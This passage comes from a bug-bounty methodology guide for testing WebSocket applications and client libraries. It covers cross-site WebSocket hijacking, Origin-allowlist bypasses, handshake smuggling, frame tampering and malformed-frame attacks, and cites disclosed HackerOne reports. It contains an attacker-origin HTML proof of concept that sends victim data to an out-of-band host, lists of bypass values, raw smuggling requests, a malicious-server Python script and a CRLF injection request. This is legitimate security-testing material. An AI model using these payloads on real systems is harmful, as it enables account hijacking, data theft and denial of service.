  --header "Cookie: session=YOUR_SESSION"
```
A `101` from a foreign Origin is only a *signal* — many servers accept the upgrade then refuse to stream data or close on the first authenticated frame. Real proof requires the attacker-origin HTML PoC below, opened while a **different** victim account is logged in, receiving data marked as belonging to that victim, and exfiltrating it to Collaborator/OAST.

### Phase 5 — Test Origin-bypass variants
When the app has an Origin allowlist, try: backtick and `$` symbols in the domain (#931197), `null`, subdomain/suffix tricks, case variation, a leftover `http://localhost` entry, and CRLF-injected header manipulation via an upstream URL parameter (#1102780).

### Phase 6 — Test per-message authorization & GraphQL-over-WS
Handshake auth ≠ per-message auth. Send frames as unauthenticated/low-priv clients: GraphQL `connection_init`/`start`, admin actions, and subscription registrations. Validate a *verifiable server-side effect* or another user's data — an accepted-but-ignored frame is not a finding (#862835, #1023669).

### Phase 7 — Test over-broadcast / information disclosure
Compare frames across two accounts; inventory every field (email, `user_id`, tokens, full names). Confirm the data belongs to another principal rather than being an echo of your own input (#163464, #168223).

### Phase 8 — Test the client-library (malicious-server) model
If the target is a WS client/library, run your own WS server and control the handshake and frames: wrong `Sec-WebSocket-Accept` (#3474865), oversized base64 key into `strcpy` (#2298307/#3392174), fragmentation flood (#3303765), PING/PONG starvation (#3480039), timed PING endless loop (#3168039), GnuTLS upload over-read (#4099194), heap over-read with `0x4000` declared length and no payload (#1595290). Use ASan builds to surface UAFs (#4123749, #4124722).

### Phase 9 — Test handshake-layer Upgrade smuggling (not frame smuggling)
Once upgraded, frames are never re-parsed as HTTP — typing `GET /admin HTTP/1.1` in `wscat` does nothing. The real technique is making the front proxy and origin disagree at the handshake: send `Sec-WebSocket-Version: 777` (origin replies 426/400 while the proxy may already tunnel), or `Upgrade: websocket` with `Connection: keep-alive`. Drive this with Burp's HTTP Request Smuggler and confirm desync + impact OOB — never on a single ambiguous response.

### Phase 10 — Validate against Gate 0 and document
Apply the Gate 0 questions below per class, attach the OAST/cross-account/memory-corruption proof, then write the report with a real cited report as the calibration reference.

### Phase 11 — Message tampering (financial / game / checkout)
Stateful WS apps often trust client-supplied values in frames. Intercept a frame in Burp (WebSockets history → Send to Repeater or edit-and-forward) and change server-trusted fields:

```
{"price":100}        -> {"price":0.01}
{"amount":1}         -> {"amount":9999}
{"userId":123}       -> {"userId":1}
{"orderTotal":...}   -> recompute downstream?
```
**Validate** that the tampered value persists server-side — confirm via the REST/order API or a fresh socket. An optimistic UI echo of your own frame is not proof. This phase is a methodology extension of the pack's message-level findings (#2541027 shows WS posts reaching `/api/v4/posts`; #1023669 shows event registration changing server state).

### Phase 12 — Signed-message replay & state-machine bypass
If frames carry signatures (`{"type":"payment","amount":100,"signature":"..."}`), capture one in Repeater and test: (a) **time-window bypass** — replay after its expiry timestamp (clock skew / validation gap); (b) **session bypass** — replay user A's signed frame in user B's session (signature not bound to user/session ID). For stateful protocols expecting `connect → authenticate → verify_balance → place_order`, test **state skip** by sending `place_order` immediately, and test high-frequency frame spam to bypass WS-layer rate limits (separate from HTTP rate limits). Any effect must be verified through a second channel.

### Phase 13 — Methodology decision tree
```
Is the target a WS SERVER or a WS CLIENT/library?
|
+-- SERVER -> Is there a foreign-Origin 101 with NO per-connection token?
|              +-- yes -> CSWSH path (Phases 3-5) -> cross-account OAST proof
|              +-- no  -> Is the handshake cookie-only + no Origin check? -> same
|           Are low-priv frames returning other users' data?
|              +-- yes -> authz / info-disclosure path (Phases 6-7)
|           Does a start/subscription frame return a schema or events?
|              +-- yes -> GraphQL-over-WS path (Phase 6)
|           Is there a redirect/CRLF exposing an admin socket?
|              +-- yes -> access-control path (Probe 10)
|
+-- CLIENT -> Control the handshake/frames from your own WS server (Phase 8)
               +-- wrong Accept accepted        -> MITM/hijack class
               +-- oversized base64 key         -> strcpy overflow class
               +-- FIN=0 + continuation flood   -> memory DoS class
               +-- timed PING / no PONG          -> loop/starvation class
               +-- declared length, no payload  -> over-read class
               +-- pause/debug callback reentry -> UAF class
```
Work top-down: the server-side CSWSH/authz classes are the most frequently reported and the easiest to prove with OAST; the client-side memory-safety classes require source review or a malicious server but carry high CVSS when confirmed.

---

## Payload & Detection Patterns

### Recon one-liners
```bash
# Version + sid fingerprint
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
# Forged sid against polling transport: 400 "Session ID unknown" = good
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
# Non-standard WS ports
nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
```

### CSWSH attacker-origin PoC (must receive VICTIM data)
```html
<html><body><pre id="out"></pre><script>
var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
var ws = new WebSocket("wss://TARGET/ws");                     // browser sets Origin/Cookie
ws.onopen = () => {
  log("[+] 101 opened from attacker origin");
  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
};
ws.onmessage = e => {
  log("VICTIM-DATA: " + e.data);
  // Exfil PROOF to OAST so receipt is recorded out-of-band:
  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
};
ws.onerror = e => log("ERR (Origin/auth likely rejected at message layer)");
function log(s){document.getElementById("out").textContent += s + "\n";}
</script></body></html>
```
Meteor/SockJS analogue from #178990: replay captured frames such as
`["{\"msg\":\"connect\",\"version\":\"1\",\"support\":[\"1\",\"pre2\",\"pre1\"]}"]`,
`["{\"msg\":\"ping\"}"]`,
`["{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"user\":{\"email\":\"...\"},\"password\":{\"digest\":\"...\"}}]}"]`.

### Origin-bypass probe values
```
Origin: http://evil.com
Origin: null
Origin: https://app.example.com.evil.com
Origin: https://app.e`xample.com        <- backtick (#931197)
Origin: https://app.example$.com        <- dollar symbol (#931197, Firefox)
Origin: http://localhost:80             <- leftover allowlist entry (#931197)
```

### GraphQL-over-WS frames (#862835, #1023669)
```json
{"type":"connection_init","payload":{"Authorization":"{argus_token}"}}
{"type":"start","payload":{"query":"query IntrospectionQuery{ __schema{ types{ name fields{ name } } } }"}}
```
Then register event/subscription operations as a permissionless account and watch for another user's data.

### socket.io namespace/room packets (Phase 5 pattern)
```
40/admin,                                   <- Engine.IO MESSAGE(4) + socket.io CONNECT(0) -> /admin
42/admin,["join",{"room":"user_999_private"}]
42["subscribe",{"channel":"admin_events"}]  <- root namespace
```
Server replies `40/admin,{"sid":"..."}` on success or `44/admin,{...}` on error. A success for a low-priv user is the bug; receiving `42` event frames with foreign data is the proof. **Do not use `?nsp=/admin`** — it is not a recognized socket.io param and silently connects to `/`.

### Malicious-server handshake & frame probes (client-side class)
```
# Wrong Sec-WebSocket-Accept; still get "ws: received TEXT frame 'hello'" (#3474865)
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: WRONGKEY

<single WS text frame "hello">

# FIN=0 fragmented message + continuation-frame flood -> OOM (#3303765)
# Timed PING during CURLWS_OFFSET send -> endless loop (#3168039)
# PING with no PONG during large curl_ws_send -> keep-alive drop (#3480039)
# Frame declaring 0x4000 bytes with no payload -> heap over-read (#1595290)
# Oversized base64 Sec-WebSocket-Key -> strcpy overflow (#2298307/#3392174)
# curl -T <file> wss://attacker/ with GnuTLS -> out-of-bounds read (#4099194)
```

### CRLF → dashboard → WS exposure (#1102780)
```
GET #password_reset/%0d%0aSet-Cookie:%20crlf-injection=mickey HTTP/1.1
Host: support.nextcloud.com
...
# then inspect network-browser for /api/v1/signshow websocket
```

### Tooling
```bash
npm install -g wscat              # raw + socket.io WS client
brew install websocat             # alt client; used in #1023669
# Burp Suite Pro: WebSockets history (intercept/edit/replay),
#   HTTP Request Smuggler (handshake smuggling), Collaborator (OAST proof).
# Burp MCP: get_proxy_websocket_history / _regex to enumerate frames;
#   generate_collaborator_payload + get_collaborator_interactions for OAST proof.
```

### Grep patterns for source review
```bash
grep -rE "strcpy\(|memcpy\(|new u\(e\.url\)|a\.send\(e\.arg\)" --include="*.c" --include="*.js" .
grep -rE "io\.origins\(|Sec-WebSocket-Accept|ws_dec_pass_payload|ws_flush\(" --include="*.js" --include="*.c" .
```

### Message tampering / replay payloads
```bash
# Intercept in Burp WebSockets history, edit-and-forward, or replay with wscat
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# > {"action":"buy","amount":1,"price":0.01}     # tamper server-trusted price
# > {"type":"payment","amount":100,"signature":"captured..."}  # replay
# Confirm persistence via the order/balance REST API, not the UI echo.
```

### State-machine / rate-limit probes
```
1) connect -> place_order                (skip authenticate/verify_balance)
2) send 100s of identical frames/second (WS-layer rate limit evasion)
3) replay user A's signed frame inside user B's socket (session-binding failure)
4) replay a signed frame after its stated expiry (clock-skew / freshness gap)
```

### SignalR / Phoenix analogues
```
# SignalR: negotiate at /<hub>/negotiate, then connect and Invoke/Send methods
#   Test method-level authorization:  {"target":"adminMethod","arguments":[]}
# Phoenix Channels: join topic:subtopic and check join/3 authorization
#   {"topic":"room:private_999","event":"phx_join","payload":{},"ref":1}
```

### Handshake smuggling raw HTTP probes (HTTP layer, not frames)
```
# A) valid-looking upgrade, unsupported version -> origin 426/400, does proxy tunnel?
GET / HTTP/1.1
Host: TARGET
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 777
Sec-WebSocket-Key: <16-byte base64>

# B) Upgrade present but Connection: keep-alive (header mismatch)
# C) after a "successful" 101, append a second request and watch for a
#    desynced response on the same connection (confirm with OAST, never a
#    single ambiguous response)
```

### Python malicious-server skeleton (client-side class)
```python
# Minimal WS server that sends a wrong Sec-WebSocket-Accept + a text frame
# Reproduces #3474865 / #3917775; adapt frame bytes for the other classes.
import socket, base64, hashlib, struct

def accept(key):
    return base64.b64encode(hashlib.sha1(
        (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()

s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 9000)); s.listen(1)
c, a = s.accept()
req = c.recv(4096).decode(errors="ignore")
key = next((l.split(":",1)[1].strip() for l in req.splitlines()
            if l.lower().startswith("sec-websocket-key")), "")
# For the "wrong Accept" test, send a deliberately incorrect value:
resp = ("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n"
        "Connection: Upgrade\r\nSec-WebSocket-Accept: WRONGKEY\r\n\r\n")
c.sendall(resp.encode())
# Unmasked server text frame "hello": FIN+text=0x81, len=5
c.sendall(bytes([0x81, 0x05]) + b"hello")
# FIN=0 fragmentation flood would use 0x01 then repeated 0x80 continuation frames.
```

### OAST proof helper (Burp MCP)
```
1) generate_collaborator_payload  -> unique https://<id>.oastify.com/cswsh
2) embed in the attacker-origin PoC's ws.onmessage exfil (sendBeacon)
3) open the PoC with a SEPARATE victim account logged into TARGET
4) get_collaborator_interactions  -> confirm the callback carrying VICTIM-DATA
```
A callback proves receipt out-of-band; the planted marker proves the data belonged to the victim. Both are required for the CSWSH claim.

---

## Common Root Causes

1. **Origin treated as decoration, not authorization.** Handlers accept `101` from any Origin; reporters proved it by swapping in `http://evil.com` and still getting a working socket (#274324, #211283).
2. **String-based allowlists with parser differentials.** `io.origins(['http://localhost:80'])` bypassed with backtick/`$` characters that Firefox permits in domains — the validator and the client parsed the Origin differently (#931197).
3. **Ambient cookie as the only handshake credential, no CSRF token.** Cross-origin JS cannot set Origin/Cookie — the browser sets them, which is exactly the CSWSH threat model (#211283, #178990).
4. **Authentication once at connect, never again per message or per subscription.** A permissionless staffer registers Shopify Ping events and listens to customer conversations (#1023669); unauthenticated GraphQL `start` frames carry introspection queries (#862835).
5. **Over-broadcast / excessive data in frames.** Sockets stream other users' emails and `user_id` to every connected client (#163464, #168223).
6. **Auth/redirect bypass exposing internal APIs and sockets.** CRLF `Set-Cookie` injection redirected to a dashboard where a websocket endpoint and API directory became visible (#1102780).
7. **Privileged message relay in browser extensions.** A content-script-controlled `socket` command let a crafted page open a WS from the extension background page "with cookies and origin" to any URL (#395729).
8. **Unvalidated handshake fields in C/C++ stacks.** `strcpy(keyval, randstr)` with no bounds check on a base64 nonce (#2298307, #3392174); accepting any `Sec-WebSocket-Accept` (#3474865, #3917775).
9. **Unbounded frame buffering and control-frame starvation.** No cap on continuation frames (#3303765); PONG queued behind user data (#3480039); timed PING causing non-terminating loops (#3168039); recursion on PING (#103991).
10. **Pointer lifetime errors across pause/debug callbacks.** `ws_dec_pass_payload()` and `ws_flush()` hand out pointers into queues that callbacks can invalidate (#4123749, #4124722); declared length with no payload drives `memcpy` past bounds (#1595290); TLS backend send over-read (#4099194).
11. **Weak or reused cryptographic primitives.** Fixed masking key reused for every frame (#3330839); predictable nonce assumptions in the handshake.
12. **Insecure-by-example guidance.** Docs/examples using `ws://` rather than `wss://` encourage cleartext sockets sniffable and replayable cross-domain (#3295652, #178990).

### Root cause → discovery signal → required evidence

| Root cause | Discovery signal in the pack | Evidence that closes it |
|---|---|---|
| No Origin enforcement (#274324, #211283) | `101` from `http://evil.com` | Victim data delivered to attacker origin |
| Defeatable string allowlist (#931197) | `` ` ``/$ symbols accepted in Origin | Bypass of a real `io.origins([...])` config |
| Ambient-cookie-only handshake (#178990) | `Cookie:` present, no token | Cross-domain frame replay with victim session |
| No per-message/subscription authz (#1023669) | Permissionless event registration | Another user's conversation frames |
| Over-broadcast (#163464, #168223) | Other users' fields in frames | PII from a distinct account |
| Auth/CRLF bypass exposing WS (#1102780) | Dashboard reachable unauthenticated | WS endpoint + disclosed data |
| Privileged relay (#395729) | Content script controls `new WebSocket(e.url)` | Background-page socket to attacker URL with cookies |
| Unvalidated handshake fields (#2298307, #3474865) | `strcpy`, any `Accept` accepted | Overflow crash / injected frames |
| Unbounded buffering/control frames (#3303765, #3480039, #3168039) | FIN=0 flood, timed PING | OOM, drop, hang, reproduced |
| Pointer lifetime errors (#4123749, #1595290) | ASan trace, `0x4000` no payload | Sanitizer trace / heap bytes |
| Weak mask/nonce (#3330839) | Fixed mask in source | Reuse across frames demonstrated |
| Cleartext transport (#3295652, #178990) | `ws://` in code/docs | Sniff + replay PoC |

**Why root-cause framing matters for the report.** Triage teams fix the *cause*, not the symptom. #931197 is not "Origin header accepted" but "string-based Origin allowlist bypassed via symbols Firefox permits in domain names." #3474865 is not "client accepts frames" but "handshake response `Sec-WebSocket-Accept` never validated." Naming the cause lets you predict variants (more symbols, more spoofed response fields) and lets the client patch the right validation step. Always pair your PoC with the one-line root cause it proves.

---

## Bypass Techniques

### Origin / CSWSH bypasses
- **Special-symbol Origin** — inject `` ` `` and `$` into the Origin domain to slip a string allowlist (#931197).
- **`null` Origin, subdomain suffix, case variation** — common allowlist-parsing differentials; test before writing off a rejected Origin.
- **Leftover allowlist entries** — `http://localhost:80` accepted client-side connections from other origins in #931197.
- **Bearer/token absence** — confirm no per-connection token in URL, subprotocol, or first frame; if one exists, CSWSH is not cross-site and should be downgraded.
- **Cross-domain frame replay** — when cleartext or poorly bound, sniff frames and replay them from another origin (#178990).

### Authorization / access-control bypasses
- **Subscribe/register to another principal's channel** with a low-priv token (#1023669).
- **GraphQL `start` introspection** over an unauthenticated socket to enumerate the API before deeper attacks (#862835).
- **Namespace via protocol packet** (`40/admin,`) rather than a query param; then `42` room-join events.
- **CRLF `Set-Cookie` + redirect** to reveal dashboard APIs and WS endpoints (#1102780).
- **Extension relay abuse** — point a content-script `connect` message at an arbitrary URL (#395729).

### Handshake / parser bypasses
- **Oversized base64 `Sec-WebSocket-Key`/nonce** to overflow `strcpy` (#2298307, #3392174).
- **Wrong `Sec-WebSocket-Accept`** (`WRONGKEY`) to show the client upgrades anyway (#3474865, #3917775).
- **Version/header desync** — `Sec-WebSocket-Version: 777`, or `Upgrade: websocket` with `Connection: keep-alive`, for proxy/origin smuggling.
- **Special-symbol version strings** that pass a filter but exercise a different code path (#931197's general lesson).
- **`ws://` downgrade** — cleartext transport enables sniff/replay (#3295652, #178990).

### Frame / resource bypasses
- **FIN=0 fragmentation + continuation flood** to exhaust client memory (#3303765).
- **PING starvation / timed PING** against large sends to trigger drops or endless loops (#3480039, #3168039, #103991).
- **Declared-length-without-payload** frames (`0x4000`) to force heap over-reads (#1595290).
- **Large `wss://` uploads with GnuTLS** to over-read past the send buffer (#4099194).
- **Pause/debug callback reentry** to invalidate borrowed pointers (#4123749, #4124722).

### Concrete Origin / allowlist bypass value set
```
http://evil.com
null
https://app.example.com.evil.com
https://evil-app.example.com
https://app.example.com@evil.com
https://app.example.com.
https://APPLICATION.EXAMPLE.COM          (case variation)
https://app.e`xample.com                 (backtick, #931197)
https://app.example$.com                 (dollar symbol, #931197 — Firefox)
https://localhost:80                     (leftover allowlist entry, #931197)
https://sub.example.com                  (over-trusted subdomain, #931197 tags)
```

### Header-field manipulation matrix (handshake)
```
Sec-WebSocket-Version: 13          -> baseline
Sec-WebSocket-Version: 777         -> origin 426/400; proxy may still tunnel
Sec-WebSocket-Version: 8,13        -> multiple/ambiguous versions
Upgrade: websocket
Connection: keep-alive             -> mismatch, desync candidate
Sec-WebSocket-Key: <oversized base64> -> strcpy overflow (#2298307/#3392174)
Sec-WebSocket-Accept: WRONGKEY     -> spoofed 101 accepted (#3474865)
Origin: <see value set above>      -> allowlist bypass attempt
Cookie: session=<victim>           -> ambient credential for CSWSH
```

### Frame-field manipulation matrix (RFC 6455)
```
FRAME BYTE         NORMAL                    ADVERSARIAL
FIN/opcode         0x81 (FIN=1, text)        0x01 (FIN=0) + continuation flood (#3303765)
payload length     125/126/127 accurate      0x4000 declared, 0 bytes present (#1595290)
opcode 0x9/0xA     PING answered with PONG    PING during large send -> starvation/loop
                                              (PONG queued behind user data, #3480039)
masking key        random per frame (RFC)    fixed/reused key (#3330839)
callback timing    normal write callback      CURL_WRITEFUNC_PAUSE -> debug reentry UAF (#4123749)
```
When testing a bypass, always keep a **negative control**: the same request with the benign value (correct Origin, correct Accept, correct frame length). The pack's strongest reports show both the bypass and the correctly-rejected control — e.g. #931197's `something.io` → `400 Bad Request` control, and #3474865's implicit expectation that a wrong `Sec-WebSocket-Accept` *should* be rejected.

---

## Gate 0 Validation

Before writing the report, answer all three — per finding class:

1. **What can the attacker DO right now?**
   - CSWSH: did attacker-origin JS receive a **different** victim's data (planted unique marker / distinct PII) and exfil it to OAST? A `101` alone is insufficient.
   - Authz/info-disclosure: did a low-priv/unauthenticated socket actually receive another principal's data, or produce a verifiable server-side effect via a second channel?
   - GraphQL-over-WS: was a full schema dump or unauthorized operation returned from a `start`/subscription frame?
   - Client-side: is there a crash, ASan trace, heap bytes, MITM frame injection, or OOM — not just a malformed request sent?
2. **What does the victim LOSE?**
   - Session/refresh/token in the stream → ATO; cross-tenant PII/conversations → privacy breach; schema + unauthorized ops → further compromise; memory corruption → RCE potential; DoS → availability loss. Quantify blast radius; do not overstate a Low as Critical.
3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the WS endpoint live and the handshake/message schema unchanged?
   - Does the OAST listener/cross-account PoC/crash reproduce reliably, not intermittently?
   - Can a second person follow the steps (including two accounts or a malicious server) and get the same result?

### Per-class accept / reject
| Finding | ACCEPT (proof) | REJECT (not a finding) |
|---|---|---|
| CSWSH | Attacker-origin PoC receives victim data, OAST-exfiltrated | Bare `101` from foreign Origin; self-echoed data |
| Message/subscription authz | Foreign data or verifiable server-side effect | Accepted-but-ignored frame; connected-but-empty namespace |
| Info disclosure | Another user's PII/tokens in frames | Your own data echoed back |
| GraphQL-over-WS | Schema dump or unauthorized op from `start` frame | Introspection explicitly enabled by design |
| Handshake smuggling | Desync proven by differential/timing + impact, OAST-confirmed | Single ambiguous response guess |
| Client memory safety | Crash/ASan trace/heap bytes/MITM frame injection | A malformed frame that is cleanly rejected |

### Evidence checklist (attach to the report)
- [ ] Two-account setup documented (attacker account + distinct victim account with a planted unique marker / distinct PII).
- [ ] Attacker-origin PoC HTML (or raw Repeater request) included verbatim.
- [ ] OAST/collaborator interaction log showing the received victim data, with the unique marker visible.
- [ ] Negative control: benign Origin / correct Accept / correct frame length rejected; bypass value accepted.
- [ ] Server-side effect verified through a second channel (REST API, fresh socket, or database state) for authz/tampering findings.
- [ ] For client memory-safety findings: crash trace, ASan output, heap bytes, or captured injected frames — not just a request you sent.
- [ ] Reproduction steps a second person can follow in under 10 minutes.
- [ ] Real ID cited as calibration (from the 25-report citation list), with the correct year and severity.

### Common false-positive traps seen in this corpus
- **"`101` from evil Origin = CSWSH."** #274324 showed the upgrade can succeed while the sock still refuses to stream data. No data = no CSWSH.
- **"The frame was accepted."** Accepted-but-ignored frames and connected-but-empty namespaces are not authorization bypasses.
- **"My own data came back."** A self-echo from your own account is not cross-tenant disclosure; #163464/#168223 required *many users'* data.
- **"Introspection is enabled."** If the app intentionally enables introspection, #862835 is not a bug; the finding was that it worked over an *unauthenticated* WS.
- **"I sent a malformed frame."** Without a crash, over-read, hang, or injection, a rejected malformed frame is negative-test noise.
- **"The docs use ws://, therefore cleartext is deployed."** #3295652 was about misleading guidance; pair it with reachable cleartext and a replay PoC to claim real impact.

---

## Real Impact Examples

### Scenario A — Total app takeover through CSWSH (Legal Robot pattern, #211283 / #178990 / #274324)
The reporter observed that "almost all the request in the site are performed in web socket" and that the upgrade request "can be called from an external origin." Captured SockJS/Meteor frames (connect, ping, `method:login`) were replayed cross-domain, and once a victim visited the attacker page, every server response could be read by the attacker — "side-wise CSRF plus every response from server could be possible to be read by attacker." With no Origin validation and cookie-only handshake, this is a session-level compromise of an entire WS-driven application.

The affected domain was `app.legalrobot.com/socketjs/444/jfalksf/websocket` (#211283), and a sibling report proved the server "is still giving 101" when the Origin was replaced with `http://evil.com` or "any page containing the malware" (#274324). A third report showed the same pattern on the UAT host `app.legalrobot-uat.com` with the explicit observation: "This (upgrade) request can be called from an external origin. After knowing the websocket URL, messages (captured in chrome) can be successfully sent" (#178990). The practical PoC is the attacker-origin HTML page: open it while the victim is logged in, receive the victim's `connect`/`ping`/`login` method frames, and exfiltrate them to OAST. Because Meteor/SockJS `login` frames carry credentials, this can escalate from data theft to full account takeover — exactly the "side-wise CSRF plus every response" the reporter predicted.

### Scenario B — Cross-tenant real-time exfiltration (Shopify Ping / Instacart / Legal Robot, #1023669 / #168223 / #163464)
A permissionless staff member copied the `argus token` from `GetToken`, connected to `wss://argus.shopifycloud.com/graphql?shop_id={id}`, sent `connection_init`, and registered WS events — then listened to conversations with customers. In parallel, reporters simply "monitoring the websocket requests" found other users' `email` and `user_id` streamed to the client. These are High-severity privacy breaches that require no exploit primitives beyond an authorized but under-privileged account.

The exact disclosure examples are striking: one report noted "There's hundreds of these requests, each containing user information" (#163464), while another displayed a concrete frame — `{"t":"d","d":{"r":8,"a":"p","b":{"p":"/carts/3671079_xjdJHqx88J435eDW5zxN/users/-KRbGN8R6uIjy6_OPx_j","d":{"id":25390626,"name":"Username}}}}` — streaming a user_id and name to the client (#168223). On the Shopify side, the reporter used `websocat` against `wss://argus.shopifycloud.com/graphql?shop_id={id}` and sent `{"type":"connection_init","payload":{"Authorization":"{token}"}}` before registering events (#1023669). The lesson: the WebSocket is often a second, less-guarded data plane that bypasses the REST API's carefully built permission checks. Always diff what an under-privileged account can *see* over the socket against what its HTTP endpoints allow.

### Scenario C — Full API map and unauthorized operations over WS (Nuri #862835)
An unauthenticated WebSocket accepted `{type:"start", payload:{query:"query IntrospectionQuery{...}"}}` and returned the complete GraphQL schema. The reporter noted it "reveals the full GraphQL API with all methods and data types. This can be used to perform more complex attacks." The PoC was a static HTML page served locally (`python3 -m http.server` then `http://localhost:8000/ws.html`) to bypass CORS restrictions — a trivially reproducible, Medium (CVSS 6.1) finding. The reporter observed that "the websocket request with type `start` (maybe others too, I didn't check) allows to pass introspection query in it (`{type: "start", payload: {query: "query IntrospectionQuery{ ... }"}}`)." The impact statement — "This information reveals the full GraphQL API with all methods and data types. This can be used to perform more complex attacks" — is a good model for chaining: the WS introspection is the *entry*, and the deeper auth attacks come next. Note the technique tags in the pack: graphql, api-endpoint, websocket, internal-network, filter-bypass, cors-misconfig, graphql-technique — a reminder that WS bugs frequently sit at the intersection of several surfaces.

### Scenario D — Malicious WS server compromises the client library (curl cluster)
A hostile server returns `Sec-WebSocket-Accept: WRONGKEY` and curl still upgrades and processes injected frames (#3474865, #3917775); an oversized base64 nonce overflows `strcpy` in the handshake (#2298307 CVSS 8.6, #3392174); a FIN=0 flood drives OOM (#3303765); timed PINGs hang the send loop (#3168039); a fixed mask weakens framing (#3330839); and ASan traces expose UAFs in `ws_dec_pass_payload`/`ws_flush` (#4123749, #4124722). These are client-side threats to any application embedding the library.

Two reports are especially instructive about the *handshake being the attack surface*: #2298307 instructed "Provide a base64-encoded nonce value that exceeds the buffer size" against a `strcpy` with no bounds check (High, CVSS 8.6), and #3392174 pinpointed `lib/ws.c:1287` where `strcpy(keyval, randstr)` is called "without proper bounds checking, despite having a bounds check earlier in the code" (High). #1595290 showed a server-side variant: a frame "purports to transfer `0x4000` bytes of payload ... However, the frame does not actually include any payload," causing `memcpy()` to copy `0x4000-1` bytes of beyond-bounds heap into the buffer — a controllable heap-data exfiltration primitive. For any WS client deployment, treat the handshake and frame parser as first-class attack surface, not just the application frames.

### Scenario E — Auth bypass exposing a hidden socket (Nextcloud, #1102780)
A CRLF `Set-Cookie` injection in a password-reset URL redirected to a dashboard without credentials. Inspecting the browser network tab exposed an API directory and `https://support.nextcloud.com/api/v1/signshow` websocket that disclosed information — a High-severity access-control failure discovered by chaining a redirect bug into WS exposure.

The reporter's steps are a compact lesson in chained discovery: open `https://support.nextcloud.com/#password_reset`, use forget-password and repeat the URL in Burp, add the bypass parameter ``//%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//``, observe the redirect to the dashboard panel without user/pass, then "Show the network-browser and you can found api directory and websocket." The WS endpoint at `https://support.nextcloud.com/api/v1/signshow` disclosed information once opened. The technique tags in the pack — server-side-rendering, api-endpoint, redirect-handling, cookie-handling, websocket, admin-internal, filter-bypass, request-smuggling, open-redirect, misconfiguration — show how WS exposure was the *last hop* of a multi-bug chain. When a WS endpoint appears in a response you should not have access to, treat it as a lead: test whether the socket streams data that the unauthenticated context should never receive.

---

## Disclosed Report Citations (all 25 real reports read from the study pack)

The study pack assigns **29 reports (8 from TOP lists)** and provides **FULL disclosed text for 25** of them. The entries below are **every verifiable report ID present in the pack** — 25 real citations. No IDs have been invented and no entries padded; the remaining 4 assigned reports were not supplied in full, so they are not cited. Severity, company, technique tags, and year are transcribed from the pack; "no bounty disclosed" means the pack showed `—`. All are HackerOne report IDs.

1. **curl — WebSocket Fragmentation DoS on Curl Client** ([H1 #3303765](https://hackerone.com/reports/3303765)) — client-side resource exhaustion, FIN=0 + continuation-frame flood; 2025 / no bounty disclosed (High, Uncontrolled Resource Consumption).
2. **Nuri — GraphQL introspection query works through unauthenticated WebSocket** ([H1 #862835](https://hackerone.com/reports/862835)) — GraphQL-over-WS introspection via unauthenticated `{type:"start"}`; 2020 / no bounty disclosed (Medium CVSS 6.1, Misconfiguration).
3. **curl — WebSocket Logic Error: Control Frame (PING/PONG) Starvation causes Connection Drop (DoS) during large transfers** ([H1 #3480039](https://hackerone.com/reports/3480039)) — control-frame starvation DoS; 2025 / no bounty disclosed (Medium, Business Logic Errors).
4. **Legal Robot — User Information sent to client through websockets** ([H1 #163464](https://hackerone.com/reports/163464)) — information disclosure / over-broadcast of user emails; 2016 / no bounty disclosed.
5. **Nextcloud — bypassing dashboard without account + Information disclosure trough websockets** ([H1 #1102780](https://hackerone.com/reports/1102780)) — CRLF Set-Cookie + redirect → dashboard/WS exposure; 2021 / no bounty disclosed (High, Improper Access Control).
6. **Instacart — User Information sent to client through websockets** ([H1 #168223](https://hackerone.com/reports/168223)) — information disclosure of `user_id` in frames; 2016 / no bounty disclosed.
7. **Superhuman (formerly Grammarly) — `socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension** ([H1 #395729](https://hackerone.com/reports/395729)) — extension WS relay to arbitrary origins; 2018 / no bounty disclosed (High).
8. **curl — Buffer Overflow Vulnerability in WebSocket Handling** ([H1 #2298307](https://hackerone.com/reports/2298307)) — `strcpy` handshake overflow via oversized base64 nonce; 2023 / no bounty disclosed (High CVSS 8.6, Heap Overflow).
9. **Node.js third-party modules — [socket.io] Cross-Site Websocket Hijacking** ([H1 #931197](https://hackerone.com/reports/931197)) — CSWSH / Origin-allowlist bypass with `` ` ``/$ symbols, socket.io 2.3.0; 2020 / no bounty disclosed (High CVSS 8.1, CSRF).
10. **Shopify — Staff with no permissions can listen to Shopify Ping conversations by registering to its different WebSocket Events** ([H1 #1023669](https://hackerone.com/reports/1023669)) — GraphQL-over-WS subscription authorization failure; 2020 / no bounty disclosed (Information Disclosure).
11. **curl — Insecure WebSocket Usage in curl Documentation and Examples (CWE-319: Cleartext Transmission of Sensitive Information)** ([H1 #3295652](https://hackerone.com/reports/3295652)) — insecure `ws://` guidance; 2025 / no bounty disclosed (High).
12. **curl — Buffer Overflow in WebSocket Handshake (lib/ws.c:1287)** ([H1 #3392174](https://hackerone.com/reports/3392174)) — `strcpy` handshake overflow; 2025 / no bounty disclosed (High, Classic Buffer Overflow).
13. **curl — libcurl WebSocket handshake accepts any Sec-WebSocket-Accept** ([H1 #3474865](https://hackerone.com/reports/3474865)) — missing Accept verification / frame injection; 2025 / no bounty disclosed.
14. **Internet Bug Bounty — Controllable read beyond bounds in lua_websocket_readbytes() [zhbug_httpd_126]** ([H1 #1595290](https://hackerone.com/reports/1595290)) — heap over-read in httpd `mod_lua`; 2022 / no bounty disclosed (Low, Information Disclosure).
